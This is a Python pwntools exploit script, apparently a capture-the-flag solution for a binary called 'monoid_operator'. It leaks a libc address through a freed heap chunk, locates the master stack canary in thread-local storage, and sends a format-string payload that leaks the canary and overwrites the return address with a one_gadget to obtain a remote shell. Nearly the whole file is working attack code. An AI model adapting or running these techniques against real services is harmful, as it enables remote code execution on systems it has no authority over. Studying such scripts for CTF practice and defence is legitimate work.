#!/usr/bin/env python
#encoding: utf-8;

from pwn import *

import sys

FILENAME = "./monoid_operator"

rhp2 = {'host':"localhost",'port':12344}
context(os='linux',arch='amd64')
binf = ELF(FILENAME)


onegadgets = [0xe237f,0xe2383,0xe2386,0x106ef8]
#constraints
#[rcx]==NULL||rcx==NULL  && [rbp-0x70]==NULL
#[rcx]==NULL && [rdx]==NULL
#[rsi]==NULL && [rdx]=NULL
#[rsp+0x70]==NULL

tls_off = 0x1ec5c0
canary_off = 0x28

def hoge(conn,op,num,ints):
  conn.recvuntil("choose?\n")
  conn.sendline(op)
  conn.recvuntil("input?\n")
  conn.sendline(str(num))
  conn.recvline("integers.\n")
  conn.sendline(" ".join(map(str,ints)))
  if(num-len(ints)>0):
    conn.sendline(" 0"*(num-len(ints)))

def exploit(conn):
  #allocate big chunk, free it, and leak main_arena+96 & libc_base
  hoge(conn,"+",(0x500)/8,[0xffffffffffffffff,2])
  hoge(conn,"+",(0x500)/8,[0,'A'])
  conn.recvuntil("The answer is ")
  addr = int(conn.recvline()[:-2])
  libc_base = addr - 0x1e4ca0
  canary_addr = libc_base + tls_off + canary_off
  print("[+]addr: "+hex(addr))
  print("[+]libc_base: "+hex(libc_base))
  print("[+]canary addr: "+hex(canary_addr))
  print("[+]onegadget0: "+hex(libc_base + onegadgets[0]))

  conn.recvuntil("choose?\n")
  conn.sendline("q")
  conn.recvuntil("name?\n")
  raw_input()
  conn.sendline("smallkirby")
  conn.recvuntil("!\n")
  
  #FSA with reading canary from Master Canary(TLS)
  pay = "A"*4
  pay += p64(0xdeadbeefdeadbeef) #%18
  pay += "%8$"+str(0x410-0x8-0x10+1)+"c" #%19 #canaryの手前
  pay += "%24$.7s"+"%28%c" #canary
  pay += "%8$6c" #rbp
  pay += p64(onegadgets[1]+libc_base) #RA #%22
  pay += "A"*7
  pay += p64(canary_addr+1) #%24
  conn.send(pay)

  #GOT A SHELL!



if len(sys.argv)>1:
  if sys.argv[1][0]=="d":
    cmd = """
      set follow-fork-mode parent
    """
    conn = gdb.debug(FILENAME,cmd)
  elif sys.argv[1][0]=="r":
    conn = remote(rhp1["host"],rhp1["port"])
else:
    conn = remote(rhp2['host'],rhp2['port'])
exploit(conn)
conn.interactive()

